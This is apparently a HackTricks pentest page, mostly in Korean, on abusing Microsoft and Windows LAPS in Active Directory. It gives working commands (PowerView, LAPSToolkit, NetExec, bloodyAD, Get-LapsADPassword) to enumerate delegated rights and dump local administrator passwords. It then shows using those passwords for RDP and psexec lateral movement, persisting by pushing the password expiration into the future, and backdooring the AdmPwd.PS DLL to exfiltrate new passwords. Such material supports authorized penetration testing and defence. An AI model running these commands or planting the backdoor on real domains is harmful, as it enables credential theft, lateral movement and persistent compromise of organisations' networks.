# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

현재 점검 중에 마주칠 수 있는 **2가지 LAPS 유형**이 있습니다:

- **Legacy Microsoft LAPS**: local administrator password를 **`ms-Mcs-AdmPwd`**에 저장하고, 만료 시간을 **`ms-Mcs-AdmPwdExpirationTime`**에 저장합니다.
- **Windows LAPS** (April 2023 updates 이후 Windows에 내장됨): 여전히 legacy mode를 에뮬레이션할 수 있지만, native mode에서는 **`msLAPS-*`** attributes를 사용하며, **password encryption**, **password history**, 그리고 domain controllers용 **DSRM password backup**을 지원합니다.

LAPS는 **local administrator passwords**를 관리하도록 설계되어 있어, domain-joined computers에서 이들을 **unique, randomized, and frequently changed** 상태로 유지합니다. 이 attributes를 읽을 수 있다면, 보통 affected host에 대해 **local admin으로 pivot**할 수 있습니다. 많은 환경에서 중요한 부분은 password 자체를 읽는 것뿐만 아니라, password attributes에 대해 **누가 delegated access**를 받았는지 찾는 것입니다.

### Legacy Microsoft LAPS attributes

domain의 computer objects에서 legacy Microsoft LAPS 구현은 두 개의 attributes를 추가합니다:

- **`ms-Mcs-AdmPwd`**: **plain-text administrator password**
- **`ms-Mcs-AdmPwdExpirationTime`**: **password expiration time**

### Windows LAPS attributes

Native Windows LAPS는 computer objects에 여러 새로운 attributes를 추가합니다:

- **`msLAPS-Password`**: encryption이 활성화되지 않았을 때 JSON으로 저장되는 clear-text password blob
- **`msLAPS-PasswordExpirationTime`**: scheduled expiration time
- **`msLAPS-EncryptedPassword`**: encrypted current password
- **`msLAPS-EncryptedPasswordHistory`**: encrypted password history
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: domain controllers용 encrypted DSRM password data
- **`msLAPS-CurrentPasswordVersion`**: 새로운 rollback-detection logic에서 사용되는 GUID-based version tracking (Windows Server 2025 forest schema)

**`msLAPS-Password`**를 읽을 수 있다면, 값은 account name, update time, 그리고 clear-text password를 포함하는 JSON object이며, 예를 들면:
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### 활성화되어 있는지 확인하기
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## LAPS Password Access

`\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol`에서 **raw LAPS policy**를 다운로드한 다음, [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) 패키지의 **`Parse-PolFile`**을 사용해 이 파일을 사람이 읽을 수 있는 형식으로 변환할 수 있습니다.

### Legacy Microsoft LAPS PowerShell cmdlets

legacy LAPS module이 설치되어 있다면, 일반적으로 다음 cmdlets를 사용할 수 있습니다:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Windows LAPS PowerShell cmdlets

Native Windows LAPS는 새로운 PowerShell module과 새로운 cmdlets를 제공합니다:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText
```
여기서 몇 가지 운영상 세부사항이 중요합니다:

- **`Get-LapsADPassword`**는 **legacy LAPS**, **clear-text Windows LAPS**, **encrypted Windows LAPS**를 자동으로 처리합니다.
- 비밀번호가 encrypted되어 있고 이를 **read**할 수는 있지만 **decrypt**할 수는 없다면, cmdlet은 메타데이터만 반환하고 clear-text password는 반환하지 않습니다.
- **Password history**는 **Windows LAPS encryption**이 활성화된 경우에만 사용할 수 있습니다.
- domain controllers에서는 반환되는 source가 **`EncryptedDSRMPassword`**일 수 있습니다.

### PowerView / LDAP

**PowerView**는 **누가 password를 read할 수 있는지 알아내고, 실제로 read**하는 데에도 사용할 수 있습니다:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
If **`msLAPS-Password`** is readable, 반환된 JSON을 파싱하고 **`p`**는 비밀번호로, **`n`**은 관리되는 로컬 admin 계정 이름으로 추출하세요.

### Linux / remote tooling

Modern tooling supports both legacy Microsoft LAPS and Windows LAPS.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
메모:

- 최신 **NetExec** 빌드는 **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`**, 그리고 **`msLAPS-EncryptedPassword`**를 지원한다.
- **`pyLAPS`**는 Linux에서 **legacy Microsoft LAPS**에 여전히 유용하지만, **`ms-Mcs-AdmPwd`**만 대상으로 한다.
- 환경이 **encrypted Windows LAPS**를 사용한다면, 단순한 LDAP read만으로는 충분하지 않다. **authorized decryptor**이거나 지원되는 decrypt 경로를 악용할 수 있어야 한다.

### Directory synchronization abuse

도메인 수준의 **directory synchronization** 권한이 있고 각 컴퓨터 객체에 대한 직접 read access가 없다면, LAPS도 여전히 흥미롭다.

**`DS-Replication-Get-Changes`**와 **`DS-Replication-Get-Changes-In-Filtered-Set`** 또는 **`DS-Replication-Get-Changes-All`**의 조합은 legacy **`ms-Mcs-AdmPwd`** 같은 **confidential / RODC-filtered** 속성을 동기화하는 데 사용할 수 있다. BloodHound는 이를 **`SyncLAPSPassword`**로 모델링한다. replication-rights 배경은 [DCSync](dcsync.md)를 확인하라.

## LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)는 여러 기능을 통해 LAPS 열거를 돕는다.\
하나는 **LAPS가 활성화된 모든 컴퓨터**에 대한 **`ExtendedRights`**를 파싱하는 것이다. 이는 특히 보호된 그룹의 사용자인, **LAPS passwords 읽기 권한이 위임된 그룹들**을 보여준다.\
도메인에 컴퓨터를 **join**한 **account**는 해당 호스트에 대해 `All Extended Rights`를 받으며, 이 권한은 그 **account**에 **password를 읽을 수 있는 능력**을 준다. 열거 결과 호스트의 LAPS password를 읽을 수 있는 user account가 나타날 수 있다. 이는 LAPS password를 읽을 수 있는 **특정 AD 사용자**를 타깃으로 삼는 데 도움이 된다.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## NetExec / CrackMapExec로 LAPS Password 덤프하기

interactive PowerShell이 없다면, LDAP를 통해 원격으로 이 privilege를 abuse할 수 있습니다:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
이것은 사용자가 읽을 수 있는 모든 LAPS 비밀을 덤프하며, 이를 통해 다른 로컬 관리자 암호로 측면 이동할 수 있습니다.

## Using LAPS Password
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## LAPS Persistence

### 만료 날짜

관리자 권한을 얻으면, **passwords**를 **얻고** **만료 날짜를 미래로 설정**해서 머신이 **password**를 **업데이트**하지 못하게 **방지**할 수 있습니다.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Native Windows LAPS는 대신 **`msLAPS-PasswordExpirationTime`**을 사용합니다:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> **admin**가 **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**를 사용하거나, **Do not allow password expiration time longer than required by policy**가 활성화된 경우에도 비밀번호는 계속 회전합니다.

### AD 백업에서 이전 비밀번호 복구하기

**Windows LAPS encryption + password history**가 활성화되어 있으면, 마운트된 AD 백업이 추가적인 secrets 소스가 될 수 있습니다. 마운트된 AD 스냅샷에 접근할 수 있고 **recovery mode**를 사용할 수 있다면, live DC와 통신하지 않고도 이전에 저장된 비밀번호를 조회할 수 있습니다.
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
이것은 주로 **AD backup theft**, **offline forensics abuse**, 또는 **disaster-recovery media access** 중에 관련이 있습니다.

### Backdoor

legacy Microsoft LAPS의 원본 소스 코드는 [here](https://github.com/GreyCorbel/admpwd)에서 찾을 수 있으므로, 코드에 backdoor를 넣는 것이 가능합니다(예를 들어 `Main/AdmPwd.PS/Main.cs`의 `Get-AdmPwdPassword` method 안에) 이렇게 하면 어떤 방식으로든 **새 password를 exfiltrate하거나 어딘가에 저장**할 수 있습니다.

그다음 새 `AdmPwd.PS.dll`을 compile해서 `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll`의 machine에 upload하고(mtime도 변경)합니다.

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)


{{#include ../../banners/hacktricks-training.md}}
